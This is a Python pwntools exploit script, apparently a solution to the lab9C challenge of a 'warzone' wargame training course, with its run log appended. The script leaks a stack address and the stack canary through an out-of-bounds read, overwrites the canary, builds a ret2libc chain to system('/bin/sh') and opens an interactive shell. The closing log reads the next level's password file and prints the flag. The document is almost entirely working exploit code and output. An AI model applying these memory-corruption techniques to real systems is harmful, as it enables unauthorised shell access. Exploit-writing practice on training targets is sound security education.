from pwn import *
import re

# context.log_level = 'debug'
# p = process('/levels/lab09/lab9C')
p = remote("127.0.0.1", 9943)

raw_input('Press Enter...')

p.recv(256)
p.sendline('2')
p.recv(256)
p.sendline('0')

result = p.recv(256)
wynik = re.search(r' = (.*?)\x0a', result).group(1)

print('wynik = ' + str(wynik))

def inject(adres):
	p.sendline('1')
	p.recv(256)
	p.sendline(str(adres))
	p.recv(256)

def leak(number):
	p.recv(256)
	p.sendline('2')
	p.recv(256)
	p.sendline(number)
	output_leak = p.recv(256)
	try:
		return re.search(r' = (.*?)\x0a', output_leak).group(1)
	except Exception as e:
		return str(e) + 'No found leak in output!'

leak_stack = leak(str(0))
print('Leak stack address: ' + format(hex(int(leak_stack) & (2**32-1))))

'''
# Leaking
for x in xrange(374):
	print(str(x), hex(int(leak(str(x))) & (2**32-1)))
'''

leak_canary = leak(str(233))

print('Leak canary: ' + format(hex(int(leak_canary) & (2**32-1))))

# Spraying
print('Start spraying')
for x in xrange(256):
	p.sendline('1')
	p.recv(256)
	znak = 1094795585
	p.sendline(str(znak))
	p.recv(256)

print('End spraying')

# Canary overwrite:
p.sendline('1')
print('leak_canary (int): ' + str(leak_canary))
p.sendline(str(leak_canary))

for x in xrange(3):
	p.sendline('1')
	p.recv(256)
	p.sendline(str(0x41414141))
	p.recv(256)

libc_address_system = hex((int(leak_stack) & (2**32-1)) + 0x2d193)
bin_sh_address = hex((int(leak_stack) & (2**32-1)) + 0x2d193 + 0x120894)

print('libc_address: ' + libc_address_system)
print('bin_sh__address: ' + bin_sh_address)

inject(int(libc_address_system, 16))
inject(int(bin_sh_address, 16))

for y in xrange(500):
	inject(int(bin_sh_address, 16))

p.sendline('3')
p.interactive()

'''
lab9C@warzone:~$ python /var/tmp/exploit.py
[+] Opening connection to 127.0.0.1 on port 9943: Done
Press Enter...
wynik = -1219805187
Leak stack address: 0xb74b3ffd
Leak canary: 0xcf55200
Start spraying
End spraying
leak_canary (int): 217403904
libc_address: 0xb74e1190
bin_sh__address: 0xb7601a24
[*] Switching to interactive mode
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: $ cat /home/lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3
[*] Got EOF while reading in interactive
$
'''


